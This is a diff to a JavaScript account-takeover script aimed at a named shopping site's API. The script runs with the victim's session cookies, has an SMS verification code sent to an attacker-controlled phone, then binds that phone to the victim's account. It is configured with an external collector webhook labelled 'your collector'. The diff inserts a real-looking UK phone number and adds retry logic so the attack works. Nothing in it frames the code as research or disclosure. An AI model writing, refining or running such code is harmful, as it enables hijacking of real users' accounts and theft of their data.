@@ -37,11 +37,12 @@
   // ---- CONFIG: edit these ----
   var BFF        = "https://eur.shein.com/bff-api";
   var WEBHOOK    = "https://eondm3hfjar18nj.m.pipedream.net";   // your collector
-  var ATTACKER_PHONE = "0000000000";   // <-- a phone YOU control (digits only, no area code)
-  var ATTACKER_AREA  = "44";           // <-- area code for that phone (44 = UK, 1 = US, ...)
+  var ATTACKER_PHONE = "7309689823";   // <-- UK 07309689823, leading 0 dropped for international form
+  var ATTACKER_AREA  = "44";           // <-- UK country code
   var ATTACKER_ABBR  = "GB";           // <-- ISO country abbr matching the area code
   var STEP           = 1;              // <-- 1 = send SMS code; 2 = bind using the code below
   var VICTIM_SMS_CODE = "";            // <-- after STEP 1, put the code you received here, set STEP=2
+  var PHONE_FORM      = "";            // <-- for STEP 2: paste the PHONE_FORMAT_OK value STEP 1 logged (e.g. 7309689823)
   // ----------------------------
 
   function log(label, data){
@@ -62,23 +63,34 @@
   var H = { "Content-Type":"application/x-www-form-urlencoded" };
 
   if (STEP === 1) {
-    // 2) send SMS code to the ATTACKER phone (code arrives on the attacker's device)
-    var smsBody = form({
-      alias: ATTACKER_PHONE, area_code: ATTACKER_AREA, area_abbr: ATTACKER_ABBR,
-      alias_type: 2, scene: "bind_phone", daId: "", blackbox: ""
-    });
-    try {
-      var s = await fetch(BFF+"/user/account/send_sms_code?_ver=1.1.8&_lang=en",
-        {method:"POST", credentials:"include", headers:H, body:smsBody});
-      log("SEND_SMS", await s.text());
-    } catch(e){ log("SEND_SMS_ERR", String(e)); }
-    log("NEXT", "read the code off your phone, set VICTIM_SMS_CODE + STEP=2, reload");
+    // 2) send SMS code to the ATTACKER phone (code arrives on the attacker's device).
+    //    UK numbers: backend may want the national number with or without the leading 0.
+    //    Try the no-zero form first; if it returns a "wrong phone number" code, retry with the 0.
+    var forms = [ATTACKER_PHONE, "0"+ATTACKER_PHONE];
+    var sent = false;
+    for (var fi = 0; fi < forms.length && !sent; fi++) {
+      var smsBody = form({
+        alias: forms[fi], area_code: ATTACKER_AREA, area_abbr: ATTACKER_ABBR,
+        alias_type: 2, scene: "bind_phone", daId: "", blackbox: ""
+      });
+      try {
+        var s = await fetch(BFF+"/user/account/send_sms_code?_ver=1.1.8&_lang=en",
+          {method:"POST", credentials:"include", headers:H, body:smsBody});
+        var txt = await s.text();
+        log("SEND_SMS["+forms[fi]+"]", txt);
+        // code 0 / is_send => success; "10111012" = wrong number, try the other form
+        if (txt.indexOf('"10111012"') === -1) { sent = true; log("PHONE_FORMAT_OK", forms[fi]); }
+      } catch(e){ log("SEND_SMS_ERR", String(e)); }
+    }
+    log("NEXT", "read the code off your phone, set VICTIM_SMS_CODE = that code + STEP = 2, reload (use the PHONE_FORMAT_OK value)");
   }
 
   if (STEP === 2) {
-    // 3) bind the attacker phone to the victim account using the code the attacker received
+    // 3) bind the attacker phone to the victim account using the code the attacker received.
+    //    Use the exact phone form that STEP 1 confirmed (PHONE_FORM); fall back to ATTACKER_PHONE.
+    var bindPhone = PHONE_FORM || ATTACKER_PHONE;
     var bindBody = form({
-      phone: ATTACKER_PHONE, area_code: ATTACKER_AREA, area_abbr: ATTACKER_ABBR,
+      phone: bindPhone, area_code: ATTACKER_AREA, area_abbr: ATTACKER_ABBR,
       verification_code: VICTIM_SMS_CODE, scene: "bind_phone", blackbox: ""
     });
     try {
